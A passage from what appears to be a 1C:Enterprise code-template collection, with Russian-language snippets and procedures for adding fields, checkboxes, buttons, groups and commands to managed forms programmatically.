{"Новый элемент",0,0,"ФЭДЭ[лемент]","лЭлемент<?""Имя элемента (слитно)"">				=	пФорма.Элементы.Добавить(лПрефиксИмя + ""<?""Имя элемента (слитно)"">"", Тип(""ПолеФормы""), пФорма);
лЭлемент<?""Имя элемента (слитно)"">.Вид			=	ВидПоляФормы.ПолеВвода;
лЭлемент<?""Имя элемента (слитно)"">.ПутьКДанным	=	""Объект.ИмяРеквизита"";
лЭлемент<?""Имя элемента (слитно)"">.Заголовок	=	""<?""Имя элемента (слитно)"">"";"}
},
{0,
{"Быстро добавить программно элемент (ПолеФормы)",0,0,"ЭДП","лЭлемент_<?""Имя элемента (слитно)""> 		= Элементы.Добавить(""<?""Имя элемента (слитно)"">"", Тип(""ПолеФормы""), Элементы);
лЭлемент_<?""Имя элемента (слитно)"">.Вид 	= ВидПоляФормы.ПолеВвода;
лЭлемент_<?""Имя элемента (слитно)"">.ПутьКДанным 	= ""<?""Имя элемента (слитно)"">"";
лЭлемент_<?""Имя элемента (слитно)"">.Заголовок	= ""<?""Имя элемента (слитно)""> (АйТи)"";
лЭлемент_<?""Имя элемента (слитно)"">.ЦветТекстаЗаголовка 	= Новый Цвет(83, 106, 194);"}
},
{0,
{"Переместить",0,0,"ФЭП","пФорма.Элементы.Переместить(Форма.Элементы.Шапка, пФорма, ПередКемВставить); // (<Элемент>, <Родитель>, <МестоРасположения>)"}
},
{0,
{"УстановитьДействие",0,0,"ЭУД[ействи]","лЭлемент.УстановитьДействие(""ПриИзменении"", ""ИмяМетодаДляВыполнения"");"}
},
{0,
{"ДобавитьКнопкуНаФорму",0,0,"","// Параметры:
//  Элементы               - ВсеЭлементыФормы
//  Команды               - КомандыФормы
//  ИмяКнопки               - Строка
//  Синоним               - Строка
//  ИмяДействия           - Строка
//  ГруппаРодитель           - ГруппаФормы (По умолчанию = Неопределено)
//  ТолькоВоВсехДействиях - Булево (По умолчанию = Ложь)
//  Картинка               - Картинка (По умолчанию = Неопределено)
//  Пометка               - Булево (По умолчанию = Ложь) 
//
Процедура ПрограммноДобавитьКнопку(Элементы, Команды, ИмяКнопки, Синоним, ИмяДействия
	, ГруппаРодитель = Неопределено, ТолькоВоВсехДействиях = Ложь, Картинка = Неопределено, Пометка = Ложь, ПрефиксИмяКоманды = ""Команда_"") Экспорт
	
	ИмяКоманды = ПрефиксИмяКоманды + ИмяКнопки;
	
	//Добавляем новую команду
	Если Команды.Найти(ИмяКоманды) = Неопределено Тогда
		Команда 			= Команды.Добавить(ИмяКоманды);
		Команда.Действие 	= ИмяДействия;
		Если Картинка <> Неопределено Тогда
			Команда.Картинка = Картинка;
		КонецЕсли;	
	КонецЕсли; 
	
	//Добавляем элемент кнопки
	Если Элементы.Найти(ИмяКнопки) = Неопределено Тогда
		Если ГруппаРодитель = Неопределено Тогда
			НоваяКнопка 	= Элементы.Добавить(ИмяКнопки, Тип(""КнопкаФормы""));
		Иначе    
			НоваяКнопка 	= Элементы.Добавить(ИмяКнопки, Тип(""КнопкаФормы""), ГруппаРодитель);
		КонецЕсли;
		
		НоваяКнопка.Вид 					= ВидКнопкиФормы.ОбычнаяКнопка;
		НоваяКнопка.ИмяКоманды 				= ИмяКоманды;
		НоваяКнопка.Заголовок 				= Синоним;
		НоваяКнопка.ТолькоВоВсехДействиях 	= ТолькоВоВсехДействиях;
		НоваяКнопка.Пометка 				= Пометка;
	КонецЕсли; 
	
КонецПроцедуры // ПрограммноДобавитьКнопку()"}
},
{0,
{"Добавить флаг",0,0,"","Процедура ПрограммноДобавитьФлаг(пФорма, пИмяРеквизита, пЗаголовок = """", пРодитель = Неопределено, пВставитьПеред = Неопределено, пПрефиксЭлемента = ""Элемент_"", пЦветТекстаЗаголовка = Неопределено)
	
	лИмяРеквизита 					= пИмяРеквизита;
	лДобавленныйРеквизит 			= Новый РеквизитФормы(лИмяРеквизита, Новый ОписаниеТипов(""Булево""), , пЗаголовок, Ложь);
	
	МассивДобавляемыхРеквизитов 	= Новый Массив;
	МассивДобавляемыхРеквизитов.Добавить(лДобавленныйРеквизит);
	пФорма.ИзменитьРеквизиты(МассивДобавляемыхРеквизитов);
	
	Если пВставитьПеред <> Неопределено Тогда
		лЭлементФормы 		= пФорма.Элементы.Вставить(пПрефиксЭлемента + лИмяРеквизита, Тип(""ПолеФормы""), пРодитель, пВставитьПеред);
	Иначе	
		лЭлементФормы 		= пФорма.Элементы.Добавить(пПрефиксЭлемента + лИмяРеквизита, Тип(""ПолеФормы""), пРодитель);
	КонецЕсли; 
	
	лЭлементФормы.Вид 			= ВидПоляФормы.ПолеФлажка;
	лЭлементФормы.ПутьКДанным 	= лИмяРеквизита;
	лЭлементФормы.ПоложениеЗаголовка 	= ПоложениеЗаголовкаЭлементаФормы.Право;
	
	Если пЦветТекстаЗаголовка <> Неопределено Тогда
		лЭлементФормы.ЦветТекстаЗаголовка 	= пЦветТекстаЗаголовка;
	КонецЕсли;

КонецПроцедуры // ПрограммноДобавитьФлаг()"}
},
{0,
{"ПрограммноПрикрепитьЭлемент",0,0,"","//Функция программно создаст новый элемент и прикрепит его относительно указанного элемента
//-------------------------------------------------------------------------
//Параметры:
//		пФорма 	- УправляемаяФорма 	- Форма, полученная как ЭтаФорма
//		пТипЭлемента 	- УправляемаяФорма 	- Вида, Тип(""ПолеФормы"") или Тип(""ДекорацияФормы""). Для декорации не будет создан реквизит формы 
//		пЭлементОснование 	- ПолеФормы 	- Элемент относительно которого добавить поле
//		пЭлементИмя 	- Строка 	- Имя для создаваемого элемента. Если пустое, будет добавлено к имени основания ""_Доп_Право"" или ""_Доп_Лево""
//		пЭлементПредставление 	- Строка 	- Представление создаваемого элемента
//		пПоложениеЗаголовкаЭлементаФормы 	- ПоложениеЗаголовкаЭлементаФормы 	- Если ничего, то без заголовка, иначе значение параметра
//		пСправа 	- Булево 	- Расположить создаваемое поле слева или справа от пЭлементОснование
//		пПоместитьВГруппу 	- Булево 	- Помещать основание и создаваемый элементы в группу (чтобы получились ""слеплены"" и выравнены)
//		пГруппаГоризонтальная 	- ГруппировкаПодчиненныхЭлементовФормы 	- Если ничего, то ГоризонтальнаяЕслиВозможно, иначе если Истина, Горизонтальная
//		пПрефиксЭлемента 	- Строка 	- Префикс создаваемого элемента, будет добавлен в начале имени
//		пУстановитьДействие 	- Структура 	- Список действий вида, Новый Структура(""ПриИзменении"") или Новый Структура(""ПриИзменении"", ""СвоеДействие"")
//Возвращаемое значение:
//		Строка 	- ИмяРеквизита, который создан. Его элемент будет иметь префикс пПрефиксЭлемента
//-------------------------------------------------------------------------
//автор: КучеровРМ 31.05.2019
Функция ПрограммноПрикрепитьЭлемент(пФорма, пТипЭлемента, пЭлементОснование, пЭлементИмя = """", пЭлементПредставление = """", пПоложениеЗаголовкаЭлементаФормы = Неопределено, пСправа = Истина, пПоместитьВГруппу = Ложь, пГруппаГоризонтальная = Неопределено, пПрефиксЭлемента = ""Элемент_"", пУстановитьДействие = Неопределено) Экспорт
	
	пИмяСоздатьПоле = """";
	
	лЭлементы				= пФорма.Элементы;
	
	лЭлементОснованиеИмя 	= пЭлементОснование.Имя;
	
	Если ПустаяСтрока(пЭлементИмя) Тогда			   
		Если пСправа Тогда
			пИмяСоздатьПоле = пЭлементОснование.Имя + ""_Доп_Право"";
		Иначе
			пИмяСоздатьПоле = пЭлементОснование.Имя + ""_Доп_Лево"";
		КонецЕсли;
	Иначе
		пИмяСоздатьПоле 	= пЭлементИмя;
	КонецЕсли; 
	
	Родитель = пЭлементОснование.Родитель;
	
	Если пПоместитьВГруппу Тогда
		ДобавленнаяГруппа 		= лЭлементы.Вставить(""Группа_"" + лЭлементОснованиеИмя, Тип(""ГруппаФормы""), Родитель, пЭлементОснование);
		ДобавленнаяГруппа.Вид 	= ВидГруппыФормы.ОбычнаяГруппа;
		ДобавленнаяГруппа.ОтображатьЗаголовок 	= Ложь;
		ДобавленнаяГруппа.Объединенная 	= Истина;
		ДобавленнаяГруппа.Отображение 	= ОтображениеОбычнойГруппы.Нет; //С этим свойством будет как бы в красивой сетке, иначе будет смещаться. Но при Объединенная = Истина всё норм
		
		Если пГруппаГоризонтальная = Неопределено Тогда
			ДобавленнаяГруппа.Группировка 			= ГруппировкаПодчиненныхЭлементовФормы.ГоризонтальнаяЕслиВозможно;
		ИначеЕсли пГруппаГоризонтальная = Истина Тогда
			ДобавленнаяГруппа.Группировка 			= ГруппировкаПодчиненныхЭлементовФормы.Горизонтальная;
		Иначе
			ДобавленнаяГруппа.Группировка 			= ГруппировкаПодчиненныхЭлементовФормы.Вертикальная;
		КонецЕсли; 
		
		лЭлементы.Переместить(пЭлементОснование, ДобавленнаяГруппа);
		
		Родитель 	= ДобавленнаяГруппа;
	КонецЕсли; 
	
	Если пСправа Тогда
		ЭлементФормы 		= лЭлементы.Добавить(пПрефиксЭлемента + пИмяСоздатьПоле, пТипЭлемента, Родитель);
	Иначе
		ЭлементФормы 		= лЭлементы.Вставить(пПрефиксЭлемента + пИмяСоздатьПоле, пТипЭлемента, Родитель, пЭлементОснование);
	КонецЕсли;
	
	Если пТипЭлемента = Тип(""ПолеФормы"") Тогда
		лДобавленныйРеквизитФормы 		= Новый РеквизитФормы(пИмяСоздатьПоле, Новый ОписаниеТипов(""Строка""), , пЭлементПредставление, Ложь);
		
		МассивДобавляемыхРеквизитов 	= Новый Массив;
		МассивДобавляемыхРеквизитов.Добавить(лДобавленныйРеквизитФормы);
		пФорма.ИзменитьРеквизиты(МассивДобавляемыхРеквизитов);
		
		ЭлементФормы.Вид 					= ВидПоляФормы.ПолеВвода;
		ЭлементФормы.ПутьКДанным 			= пИмяСоздатьПоле;
		Если ЗначениеЗаполнено(пПоложениеЗаголовкаЭлементаФормы) Тогда
			ЭлементФормы.ПоложениеЗаголовка = пПоложениеЗаголовкаЭлементаФормы;
		Иначе
			ЭлементФормы.ПоложениеЗаголовка = ПоложениеЗаголовкаЭлементаФормы.Нет;
		КонецЕсли;	
	ИначеЕсли пТипЭлемента = Тип(""ДекорацияФормы"") Тогда
		ЭлементФормы.Заголовок 	= пЭлементПредставление;
	КонецЕсли;  
	
	Если ТипЗнч(пУстановитьДействие) = Тип(""Структура"") Тогда
		Для каждого лДействие Из пУстановитьДействие Цикл
			
			лДействиеКлюч 		= лДействие.Ключ; 
			лДействиеЗначение 	= лДействие.Значение; 
			Если ЗначениеЗаполнено(лДействиеЗначение) Тогда
				ЭлементФормы.УстановитьДействие(лДействиеКлюч	, лДействиеЗначение);
			Иначе
				ЭлементФормы.УстановитьДействие(лДействиеКлюч	, ""Подключаемый_"" + пИмяСоздатьПоле + лДействиеКлюч);
			КонецЕсли; 
			
		КонецЦикла; 	
	КонецЕсли; 
	
	Возврат пИмяСоздатьПоле;
	
КонецФункции // ПрограммноПрикрепитьЭлемент()"}
},
{0,
{"Добавить на управляемую форму список значений программно",0,0,"","ДобавляемыеРеквизиты 	= Новый Массив;
Реквизит_Номенклатура 	= Новый РеквизитФормы(""НоменклатураСписок"", Новый ОписаниеТипов(""СписокЗначений""),, ""Номенклатура"");
ДобавляемыеРеквизиты.Добавить(Реквизит_Номенклатура);       
Форма.ИзменитьРеквизиты(ДобавляемыеРеквизиты);
//!!!!!!!!!!!!ТипЗначения нужно задавать ПОСЛЕ добавления реквизита (Форма.ИзменитьРеквизиты)
Форма.НоменклатураСписок.ТипЗначения = Новый ОписаниеТипов(""СправочникСсылка.Номенклатура"");

НовыйЭлемент 		= Форма.Элементы.Добавить(""НоменклатураСписок"", Тип(""ПолеФормы""), Форма.Элементы.Отборы);
НовыйЭлемент.Вид 	= ВидПоляФормы.ПолеВвода;
НовыйЭлемент.ПутьКДанным 		= ""НоменклатураСписок"";
НовыйЭлемент.ПоложениеЗаголовка = ПоложениеЗаголовкаЭлементаФормы.Верх;"}
}
},
{0,
{"Кнопка",0,0,"","
ИмяКоманды 				= ""ОткрытьНастройкаПередачиТоваровДетально"";
КомандаФормы 			= ЭтаФорма.Команды.Добавить(ИмяКоманды);
КомандаФормы.Действие 	= ""Подключаемый_ОткрытьНастройкаПередачиТоваровДетально""; //&НаКлиенте
КомандаФормы.Заголовок 	= ""Настройка передачи товаров между организациями (детально)"";
КомандаФормы.Отображение 	= ОтображениеКнопки.КартинкаИТекст;
КомандаФормы.ИзменяетСохраняемыеДанные = Ложь;

НовыйЭлемент 			= ЭтаФорма.Элементы.Добавить(""ОткрытьНастройкаПередачиТоваровДетально"", Тип(""КнопкаФормы""), Элементы.ГруппаРегламентированныйУчет);
НовыйЭлемент.Вид 		= ВидКнопкиФормы.Гиперссылка;
НовыйЭлемент.ИмяКоманды = ИмяКоманды;

//В модуль формы добавить процедуру для реагирования на событие:
&НаКлиенте
Процедура Подключаемый_ОткрытьНастройкаПередачиТоваровДетально(Команда)
	
	ОткрытьФорму(""РегистрСведений._НастройкаПередачиТоваровМеждуОрганизациямиДетальные.Форма"", , ЭтаФорма);
	
КонецПроцедуры"}
},
{0,
{"ДобавитьЭлементНаСервере (быстро)",0,0,"","&НаСервере
Процедура ДобавитьЭлементНаСервере(ЭтаФорма, ИмяКолонки, ПутьКДанным, ЭлементРодитель, пВставитьПеред = Неопределено, Заголовок = """", Видимость = Истина) Экспорт
	
	Элементы  	= ЭтаФорма.Элементы;
	
	Если Элементы.Найти(ИмяКолонки) = Неопределено Тогда
		Если ПустаяСтрока(Заголовок) Тогда
			Заголовок 	= ИмяКолонки;
		КонецЕсли;
		
		лТипЭлемента 	= Тип(""ПолеФормы"");
		
		Если пВставитьПеред = Неопределено Тогда
			лЭлементФормы 	= Элементы.Добавить(ИмяКолонки, лТипЭлемента, ЭлементРодитель);
		Иначе
			лЭлементФормы 	= Элементы.Вставить(ИмяКолонки, лТипЭлемента, ЭлементРодитель, пВставитьПеред);
		КонецЕсли;
		
		лЭлементФормы.Вид 			= ВидПоляФормы.ПолеВвода;
		лЭлементФормы.ПутьКДанным 	= ПутьКДанным;
		лЭлементФормы.Заголовок 	= Заголовок;
		лЭлементФормы.Подсказка 	= Заголовок;
		лЭлементФормы.Видимость 	= Видимость;
	КонецЕсли; 
	
КонецПроцедуры"}
},
{0,
{"Кнопка (Команда Подключаемый_)",0,0,"ПроцПодк[люч]","&НаКлиенте
Процедура Подключаемый_<?""Преффикс (АйТи)""><?""Имя элемента (слитно)"">ПриИзменении(Элемент)
	
	Подключаемый_<?""Преффикс (АйТи)""><?""Имя элемента (слитно)"">ИзмененииНаСервере();
	
КонецПроцедуры

&НаСервере
Процедура Подключаемый_<?""Преффикс (АйТи)""><?""Имя элемента (слитно)"">ИзмененииНаСервере()
	
	
	
КонецПроцедуры"}
},
{0,
{"Пример (ДополнитьФормуПрограммно)",0,0,"","&НаСервере
Процедура КЛ_ДополнитьФормуПрограммно()
	
	МассивРеквизитовФормы = Новый Массив;
	
	//Новый реквизит Товары.КЛ_ЭтоСборка
	НовыйРеквизитФормы 	= Новый РеквизитФормы(""КЛ_ЭтоСборка"", Новый ОписаниеТипов(""Булево""), ""Объект.Товары"", ""Это сборка"");
	МассивРеквизитовФормы.Добавить(НовыйРеквизитФормы);
	
	//Новый реквизит КЛ_СтатусОбработки
	НовыйРеквизитФормы 	= Новый РеквизитФормы(""КЛ_СтатусОбработки"", 
	Новый ОписаниеТипов(""ПеречислениеСсылка.СтатусыДокументовРеализации""),,""Статус обработки"");
	
	МассивРеквизитовФормы.Добавить(НовыйРеквизитФормы);
	ИзменитьРеквизиты(МассивРеквизитовФормы);
	
	НовыйЭлемент 		= Элементы.Добавить(""КЛ_СтатусОбработки"", Тип(""ПолеФормы""), Элементы.ГруппаШапкаЛевая);
	НовыйЭлемент.Вид 	= ВидПоляФормы.ПолеВвода;
	НовыйЭлемент.КнопкаОчистки = Истина;
	НовыйЭлемент.УстановитьДействие(""ПриИзменении"",""КЛ_ПриИзмененииСтатусаОбработки"");
	
	НовыйЭлемент 		= Элементы.Вставить(""КЛ_ЭтоСборка"", Тип(""ПолеФормы""),Элементы.Товары,Элементы.ТоварыКоличество);
	НовыйЭлемент.Вид 	= ВидПоляФормы.ПолеФлажка;
	
КонецПроцедуры"}
},
{0,
{"ДобавитьДанныеВСписок (Динамический)",0,0,"","Процедура ДобавитьДанныеВСписок(пЭтаФорма, пИмяСписка, пИмяРеквизита, пЭлементСписок, пЗаголовок = """", пПрефикс = ""АйТи_"") Экспорт
	
	Если ПустаяСтрока(пЗаголовок) Тогда
		пЗаголовок 	= пИмяРеквизита;
	КонецЕсли;
	
	АйТи_ОбщиеФункцииСервер.ДобавитьЭлементНаСервере(пЭтаФорма, пПрефикс + пИмяСписка + пИмяРеквизита, пИмяСписка + ""."" + пИмяРеквизита, пЭлементСписок,, пЗаголовок);
	
КонецПроцедуры // ДобавитьДанныеВСписок()


АйТи_ОбщиеФункцииСервер.ДобавитьДанныеВСписок(Форма, ""Список"", ""Контрагент"", Элементы.Список);"}
},
{0,
{"Программно несколько примеров",0,0,"","Добавить поле формы
8.3(управляемая форма):
ПолеФормы = Элементы.Добавить(""ТипКонтрагента"", Тип(""ПолеФормы""), Элементы.ГруппаКонтрагента);
ПолеФормы.Вид = ВидПоляФормы.ПолеВвода; 
ПолеФормы.Заголовок = ""Тип контрагента"";
ПолеФормы.ПутьКДанным = ""Объект.ТипКонтрагента"";
ПолеФормы.Подсказка = ""Тип контрагента"";
ПолеФормы.Доступность= Истина;
ПолеФормы.АвтоВыборНезаполненного= Истина;
ПолеФормы.АвтоОтметкаНезаполненного= Истина;
ПолеФормы.ВыбиратьТип= Ложь;
ПолеФормы.ПропускатьПриВводе = Ложь;
ПолеФормы.РасширенноеРедактирование = Ложь;
ПолеФормы.РедактированиеТекста= Истина;
ПолеФормы.РежимВыбораИзСписка= Ложь;
ПолеФормы.РежимПароля= Ложь;
ПолеФормы.ТолькоПросмотр= Ложь;
 //Кнопки
ПолеФормы.КнопкаВыбора= Истина;
ПолеФормы.КнопкаОткрытия= Истина;
ПолеФормы.КнопкаОчистки= Истина;
 //События добавляемого элемента
ПолеФормы.УстановитьДеяствие(""ПриИзменении"", ""МП_ТипКонтрагентаПриИзменении"");
Добавить колонку таблицы
8.2 (не управляемая форма):
Колонка = ЭлементыФормы.ТоварыИУслуги.Колонки.Вставить(2, ""Содержание""); 
Колонка.Имя = ""айтиСумма""; 
Колонка.Данные = ""айтиСумма""; 
Колонка.УстановитьЭлементУправления(Тип(""ПолеВвода""));
8.3(управляемая форма):
Колонка = Элементы.Добавить(""Сумма"", Тип(""ПолеФормы""), Элементы.ТабличноеПолеДокументы);
Колонка.Вид = ВидПоляФормы.ПолеВвода; 
Колонка.Заголовок = ""Сумма докeмента"";
ПолеФормы.ПутьКДанным = ""Объект.Документы.ИтогПоДокументу"";
Добавить флажок
Флажок= Элементы.Добавить(""флНУ"", Тип(""ПолеФормы""), Элементы.Шапка);
Флажок.Вид = ВидПоляФормы.ПолеФлажка; 
Флажок.Заголовок = ""НУ"";
Флажок.Подсказка = ""Налоговый учет""
Флажок.ПоложениеЗаголовка = ПоложениеЗаголовкаЭлементаФормы.Право;
Флажок.ПутьКДанным = ""Объект.НУ"";
Добавить группу

Группа  = Элементы.Добавить(""Основная"", Тип(""ГруппаФормы""), Элементы.Шапка);
Группа.Вид = ВидГруппыФормы.ОбычнаяГруппа;  
Группа.ОтображатьЗаголовок = Ложь;
Группа.Отображение = ОтображениеОбычнойГруппы.Нет;
Группа .Группировка = ГруппировкаПодчиненныхЭлементов.Горизонтальная;
Добавить подменю

Подменю = Элементы.Добавить(""ГрДействия"", Тип(""ГруппаФормы""), Элементы.КомандыСписка);
Подменю.Вид = ВидГруппыФормы.Подменю;  
Подменю.Заголовок = ""Действия"";
Добавить Команду
КомандаПодменю = Форма.Команды.Добавить(""РаспределитьПоСумме"");
КомандаПодменю.Действие = ""Сб_РаспределитьПоСумме"";
КомандаПодменю.Заголовок = ""Распределить по сумме"";
КомандаПодменю.Подсказка = ""Распределить по сумме"";
КомандаПодменю.ИзменяетСохраняемыеДанные = Истина;
КомандаПодменю.Картинка= БиблиотекаКартинок.ОтборИСортировка;
КомандаПодменю.Отображение= ОтображениеКнопки.Картинка;
Добавить Кнопку
8.2 (не управляемая форма):
Вариант 1:

     НовоеДействие =  Новый Действие(""ДействияФормыЗаполнитьИсточникиФинансирования"");
     ТипКнопки = ТипКнопкиКоманднойПанели.Действие; 
     НоваяКнопка = ЭлементыФормы.ДействияФормы.Кнопки.Добавить(""ЗаполнитьИсточникиФинансирования"",
                                 ТипКнопки,""Заполнить источники финансирования"",НовоеДействие);
     //НоваяКнопка.Имя = ""НоваяКнопка"";
     //НоваяКнопка.Имя = ""ЗаполнитьИсточникиФинансирования"";
     //НоваяКнопка.Текст = ""Заполнить источники финансирования"";
     НоваяКнопка.Отображение = ОтображениеКнопкиКоманднойПанели.Надпись;
     НоваяКнопка.Подсказка = ""Заполнить источники финансирования"";
     НоваяКнопка.Пояснение = ""Открывает табличную часть Источники финансирования"";
     НоваяКнопка.Картинка = БиблиотекаКартинок.Лупа;
     НоваяКнопка.Подсказка = ""Вызов """"Добавочное действие"""""";
     НоваяКнопка.Пояснение = ""Кнопка, добавленная средствами языка"";>
     // Сочетание клавиш Alt+Ctrl+F3
     СочетаниеКлавиш =  Новый СочетаниеКлавиш(Клавиша.F3, Истина, Истина);
     НоваяКнопка.СочетаниеКлавиш = СочетаниеКлавиш;
Вариант 2:

     КнопкаВверх  = ЭлементКоманднаяПанель.Кнопки.Добавить(""КнопкаВверх"", 
                                                           ТипКнопкиКоманднойПанели.Действие, ,
                                                           ФормаОтчета.ДействияЭлементовФормы.ПриНажатииНаКнопкуВверх);
     КнопкаВверх.Картинка = БиблиотекаКартинок.ПереместитьВверх16;
     КнопкаВверх.Отображение = ОтображениеКнопкиКоманднойПанели.Картинка;

8.3 (управляемая форма):
КнопкаПодменю = Элементы.Добавить(""РаспределитьПоСумме"", Тип(""КнопкаФормы""), Подменю);
КнопкаПодменю.Заголовок = ""Распределить по сумме"";
КнопкаПодменю.ИмяКоманды = ""РаспределитьПоСумме"";
КнопкаПодменю.Подсказка = ""Распределить по сумме"";
Добавить страницу в элементы формы
8.2 (не управляемая форма):
     ЭлементыФормы.ПанельШагов.Страницы.Добавить(Страница);

8.3 (управляемая форма):
      //Панель = Элементы.Добавить(""ПанельФормы"",Тип(""ГруппаФормы""), );
       //Панель.Вид=ВидГруппыФормы.Страницы;
   НовавяСтраницаФормы = Элементы.Добавить(ЭлементСтруктуры.Ключ,Тип(""ГруппаФормы""),Панель);
   НовавяСтраницаФормы.Заголовок = ЭлементСтруктуры.Значение;
   НовавяСтраницаФормы.Вид = ВидГруппыФормы.Страница;"}
},
{0,
{"Функция программного изменения формы",0,0,"","//Добавить в нужную форму в конец события ПриСозданииНаСервере:
//АйТи_Б24_ОбщиеФункцииСервер.ПрограммноеИзменениеФормы(ЭтаФорма);
Процедура ПрограммноеИзменениеФормы(пФорма) Экспорт
	
	Элементы 	= пФорма.Элементы;
	лИмяФормы 	= пФорма.ИмяФормы;
	
	лПодписьДоработокАйТи 	= "" (АйТи)"";
	лЦветДоработокАйТи 		= Новый Цвет(83, 106, 194);
	
	Если лИмяФормы = ""ОбщаяФорма.Б24_Синхр_ПроверитьНаОбновления"" Тогда
		Элементы.ТекущаяВерсияИнфо.Заголовок 	= Элементы.ТекущаяВерсияИнфо.Заголовок + лПодписьДоработокАйТи;
		Элементы.ТекущаяВерсияИнфо.ЦветТекста 	= лЦветДоработокАйТи;	
	ИначеЕсли лИмяФормы = ""Справочник.Б24_Синхр_НастройкиСинхронизацииСБитрикс24.Форма.ФормаЭлемента"" Тогда
		НовыеРеквизиты 	= Новый Массив;
		
		НовыйРеквизит 	= Новый РеквизитФормы(""м2"", Новый ОписаниеТипов(""Число""),""Объект.Запасы"", ""м2"");
		НовыйРеквизит2 	= Новый РеквизитФормы(""м3"", Новый ОписаниеТипов(""Число""),""Объект.Запасы"", ""м3"");
		
		НовыеРеквизиты.Добавить(НовыйРеквизит);
		НовыеРеквизиты.Добавить(НовыйРеквизит2);
		пФорма.ИзменитьРеквизиты(НовыеРеквизиты);
	ИначеЕсли лИмяФормы = ""Справочник.Б24_Синхр_НастройкиСинхронизацииСБитрикс24.Форма.НастройкаСинхронизацииСделок"" Тогда
		//Элементы.ЗагружатьСделки.Видимость 			= Ложь;
		//Элементы.НастройкиЗагрузкиЗаказов.Видимость = Ложь; 
		//Элементы.ВыгружатьСделки.Видимость 			= Ложь; 
		//Элементы.НастройкаВыгрузкиЗаказов.Видимость = Ложь; 
		
		Элементы.ЗагружатьСделки.ЦветТекстаЗаголовка 	= лЦветДоработокАйТи; 
		Элементы.ЗагружатьСделки.Заголовок 				= ""Загружать статус сделки"" + лПодписьДоработокАйТи;
		
		Элементы.ВыгружатьСделки.ЦветТекстаЗаголовка 	= лЦветДоработокАйТи; 
		Элементы.ВыгружатьСделки.Заголовок 				= ""Выгружать статус сделки"" + лПодписьДоработокАйТи;
		
		лИмяКнопки 	= ""АйТи_НастройкиКомпановкиПоУмолчанию"";
		ДобавитьКнопкуНаФорму(Элементы, пФорма.Команды, лИмяКнопки, ""Настройки отбора по умолчанию"" + лПодписьДоработокАйТи, лИмяКнопки, Элементы.НастройкаВыгрузкиЗаказов);
		Элементы[лИмяКнопки].ЦветТекста 	= лЦветДоработокАйТи;
	ИначеЕсли лИмяФормы = ""Справочник.Б24_Синхр_НастройкиСинхронизацииСБитрикс24.Форма.НастройкаСинхронизацииЗаказов"" Тогда 	
		лИмяКнопки 	= ""АйТи_НастройкиКомпановкиПоУмолчанию"";
		ДобавитьКнопкуНаФорму(Элементы, пФорма.Команды, лИмяКнопки, ""Настройки отбора по умолчанию"" + лПодписьДоработокАйТи, лИмяКнопки, Элементы.НастройкаВыгрузкиДокументов);
		Элементы[лИмяКнопки].ЦветТекста 	= лЦветДоработокАйТи;
	КонецЕсли;
	
КонецПроцедуры // ПрограммноеИзменениеФормы()
"}
},
{0,
{"Программно вывести КИ",0,0,"","//Функция программно выводит поля под контактную информацию (КИ), или прикрепляет их к существующему
//-------------------------------------------------------------------------
//Параметры:
//		пФорма 	- УправляемаяФорма 	- Форма, полученная как ЭтаФорма
//		пРеквизитКИ 	- Строка 	- Имя реквизита на форме, к которому добавить информацию в поле с КИ (его элемент называться должен так же!). Если пустой, то будет создан с именен пИмяСоздатьКИ
//		пИмяСоздатьКИ 	- Строка 	- Имя создаваемого реквизита. Учитывается при пустом пРеквизитКИ. И будет создана группа, куда поместит этот реквизит под КИ. И создаст события
//		пПредставление 	- Строка 	- Представление создаваемого реквизита, созданного по имени пИмяСоздатьКИ 
//		пВладелец 	- ЭлементФормы 	- Владелец группы, в которую будут помещены элементы
//		пВставитьПеред 	- ЭлементФормы 	- Перед каким элементом добавить созданный - если указан пИмяСоздатьКИ. Хотя он же в группе будет.. Наверно можно его пропустить
//		пСоздатьПримечание 	- Булево 	- Выведет правее поля КИ поле с примечанием (обычно для телефона), реквизит примечания будет с именем лИмяРеквизита + ""_КомментарийКонтакт""
//Возвращаемое значение:
//		Строка 	- Имя переданного или созданного реквизита, который в итоге на форме
//-------------------------------------------------------------------------
//автор: КучеровРМ 06.06.2019 
Функция ПрограммноВывестиКИ(пФорма, пРеквизитКИ = """", пИмяСоздатьКИ = """", пПредставление = """", пВладелец = Неопределено, пВставитьПеред = Неопределено, пСоздатьПримечание = Истина) Экспорт
	
	лИмяРеквизита 	= """";
	Родитель 		= пВладелец;
	лЭлементы		= пФорма.Элементы;
	
	Если ЗначениеЗаполнено(пРеквизитКИ) Тогда //Реквизит для вывода телефона уже есть, обращаемся к нему
		лИмяРеквизита 					= пРеквизитКИ;
		ЭлементФормы 					= лЭлементы[лИмяРеквизита];
		ЭлементФормы.КнопкаОткрытия 	= Истина;
		
		//ЭлементФормы.УстановитьДействие(""ПриИзменении""	, ""Подключаемый_"" + пРеквизитКИ + ""ПриИзменении"");
		//ЭлементФормы.УстановитьДействие(""Открытие""		, ""Подключаемый_"" + пРеквизитКИ + ""Открытие"");
	ИначеЕсли ЗначениеЗаполнено(пИмяСоздатьКИ) Тогда
		ДобавленнаяГруппа 		= лЭлементы.Добавить(""Группа_"" + пИмяСоздатьКИ, Тип(""ГруппаФормы""), пВладелец);
		ДобавленнаяГруппа.Вид 	= ВидГруппыФормы.ОбычнаяГруппа;
		ДобавленнаяГруппа.Группировка 			= ГруппировкаПодчиненныхЭлементовФормы.Горизонтальная;
		ДобавленнаяГруппа.ОтображатьЗаголовок 	= Ложь;

		Родитель 	= ДобавленнаяГруппа;
		
		лИмяРеквизита 					= пИмяСоздатьКИ;
		лДобавленныйРеквизитФормы 		= Новый РеквизитФормы(пИмяСоздатьКИ, Новый ОписаниеТипов(""Строка""), , пПредставление, Ложь);
		
		МассивДобавляемыхРеквизитов 	= Новый Массив;
		МассивДобавляемыхРеквизитов.Добавить(лДобавленныйРеквизитФормы);
		пФорма.ИзменитьРеквизиты(МассивДобавляемыхРеквизитов);
		
		//Перед каким элементом добавить созданный - если указан пИмяСоздатьКИ. Хотя он же в группе будет.. Наверно можно его пропустить
		Если пВставитьПеред <> Неопределено Тогда
			ЭлементФормы 		= лЭлементы.Вставить(""Элемент_"" + пИмяСоздатьКИ, Тип(""ПолеФормы""), Родитель, пВставитьПеред);
		Иначе
			ЭлементФормы 		= лЭлементы.Добавить(""Элемент_"" + пИмяСоздатьКИ, Тип(""ПолеФормы""), Родитель);
		КонецЕсли;
		
		ЭлементФормы.Вид 			= ВидПоляФормы.ПолеВвода;
		ЭлементФормы.ПутьКДанным 	= пИмяСоздатьКИ;
		
		ЭлементФормы.КнопкаОткрытия 	= Истина;
